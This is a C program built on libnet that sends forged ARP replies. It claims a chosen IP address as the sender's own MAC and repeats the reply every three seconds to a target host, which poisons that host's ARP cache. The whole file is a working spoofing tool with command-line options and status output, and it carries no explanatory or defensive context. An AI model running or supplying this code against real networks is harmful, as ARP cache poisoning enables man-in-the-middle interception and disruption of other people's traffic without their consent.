#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <libnet.h>

void usage (char *name){
  printf ("%s - Send arbitrary ARP replies\n", name);
  printf ("Usage: %s [-i interface] -s ip_address -t dest_ip\n", name);
  printf ("    -i    interface to send on\n");
  printf ("    -s    IP address we are claiming to be\n");
  printf ("    -t    IP address of recipient\n");
  printf ("    -m    Ethernet MAC address of recipient\n");
  exit (1);
}

int
main (int argc, char *argv[]){

	char *device=NULL;       
	char *ip_target_s, *ip_spoof_s;
	char arg;            
	in_addr_t ip_spoof;  
	in_addr_t ip_target; 
	u_int8_t *mac_target, *ip_addr_p;
	libnet_t *libnet_context;        
	libnet_ptag_t arp = 0, eth = 0;  
	struct libnet_ether_addr *mac;   
	char errbuf[LIBNET_ERRBUF_SIZE]; 
	int length;            
	unsigned long long int i;

  if(argc != 9){
		usage (argv[0]);
	}

	while ((arg = getopt (argc, argv, "i:t:s:m:")) > 0){
		switch (arg){
		case 'i':
			device = optarg;
			printf("[i] Using interface %s\n", device);
			break;
		case 's':
			if ((ip_spoof = inet_addr (optarg)) == -1){
				fprintf (stderr, "[-] Invalid spoofing IP address\n");
				usage (argv[0]);
			}
			ip_spoof_s=libnet_addr2name4(ip_spoof,LIBNET_RESOLVE);
				if ( ip_spoof != -1 ) {
					ip_addr_p = (u_int8_t*)(&ip_spoof);
					printf("[+] spoof IP:\t%d.%d.%d.%d (%s)\n", ip_addr_p[0],
						ip_addr_p[1], ip_addr_p[2], ip_addr_p[3], ip_spoof_s);
				}
				else {
					fprintf(stderr, "[-] Error converting IP address to spoof\n");
					libnet_destroy(libnet_context);
					exit(EXIT_FAILURE);
				}
			break;
		case 't':
			if ((ip_target = inet_addr (optarg)) == -1){
				fprintf (stderr, "Invalid destination IP address\n");
				usage (argv[0]);
			}
			ip_target_s=libnet_addr2name4(ip_target,LIBNET_RESOLVE);
				if ( ip_target != -1 ) {
					ip_addr_p = (u_int8_t*)(&ip_target);
					printf("[+] target IP:\t%d.%d.%d.%d (%s)\n", ip_addr_p[0],
						ip_addr_p[1], ip_addr_p[2], ip_addr_p[3], ip_target_s);
				}
				else {
					fprintf(stderr, "[-] Error converting target IP address\n");
					libnet_destroy(libnet_context);
					exit(EXIT_FAILURE);
				}
			break;
		case 'm':
			if ((mac_target = libnet_hex_aton (optarg, &length)) == NULL){
				fprintf (stderr, "Error on MAC address\n");
				usage (argv[0]);
			}
			if (mac_target != NULL) {
					printf("[+] target MAC:\t");
					for ( i=0; i < length; i++) {
						printf("%02X", mac_target[i]);
						if ( i < length-1 )
						printf(":");
					}
					printf("\n");
					free(mac_target);
				}
				else {
					fprintf(stderr, "[-] Error converting target MAC address\n");
					libnet_destroy(libnet_context);
					exit(EXIT_FAILURE);
				}

			break;
		default:
			usage (argv[0]);
			break;
		}
	}

  
  libnet_context = libnet_init (LIBNET_LINK, device, errbuf);
  if (libnet_context == NULL){
      fprintf (stderr, "[-] Error opening context: %s", errbuf);
exit(EXIT_FAILURE);
    }

  
  mac = libnet_get_hwaddr (libnet_context);
if ( mac == NULL ) {
		fprintf(stderr, "[-] Couldn't get own MAC address: %s\n", libnet_geterror(libnet_context));
		libnet_destroy(libnet_context);
		exit(EXIT_FAILURE);
	}
printf("[+] my MAC:\t%02X:%02X:%02X:%02X:%02X:%02X\n",		mac->ether_addr_octet[0],mac->ether_addr_octet[1],mac->ether_addr_octet[2],mac->ether_addr_octet[3],mac->ether_addr_octet[4],mac->ether_addr_octet[5]);
  
printf("%s","[i] Building ARP packet...");
  if((arp = libnet_autobuild_arp (
ARPOP_REPLY,
                            (u_int8_t *) mac,
                            (u_int8_t *) &ip_spoof,   
                            mac_target,               
                            (u_int8_t *) &ip_target,  
                            libnet_context)           

  ) == -1){
      fprintf (stderr,
           "[-] Error building ARP header: %s\n", libnet_geterror (libnet_context));libnet_destroy(libnet_context);
			exit(EXIT_FAILURE);
    }printf("%s","done\n");
	printf("%s","[i] Enveloping Ethernet frame...");

 
  if((eth = libnet_build_ethernet (mac_target, 
                             (u_int8_t *) mac, 
                             ETHERTYPE_ARP,    
                             NULL,             
                             0,                
                             libnet_context,   
                             0)                

  ) == -1) {
      fprintf(stderr, "[-] Error building Ethernet header: %s\n",libnet_geterror(libnet_context));
			libnet_destroy(libnet_context);
			exit(EXIT_FAILURE);
    }printf("%s","done\n");

  
i=0;
  while ((length=libnet_write (libnet_context)) != -1){

    printf("%s%d\n","[+] Sending stage ",i++);
	sleep(3);
}
if(length == -1){
      fprintf(stderr, "[-] Error sending packet: %s\n",libnet_geterror(libnet_context));
				libnet_destroy(libnet_context);
				exit(EXIT_FAILURE);}
printf("%s","... done\n");
  libnet_destroy (libnet_context);
  return 0;
}

